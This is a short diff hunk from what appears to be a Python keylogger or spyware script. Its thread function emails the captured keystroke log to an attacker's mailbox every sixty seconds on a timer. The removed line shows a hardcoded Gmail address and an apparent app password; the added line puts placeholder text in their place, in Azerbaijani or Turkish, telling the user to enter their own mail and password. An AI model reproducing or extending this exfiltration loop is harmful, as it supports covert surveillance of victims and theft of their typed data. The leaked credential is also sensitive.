@@ -65,7 +65,7 @@ def screensharing():
 
 def thread_function():
     global log
-    sender_email("rastgeletryhackme@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
+    sender_email("Oz mailivi bura yazirsan", "burada sifreni", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(60,thread_function)
     timer_object.start()
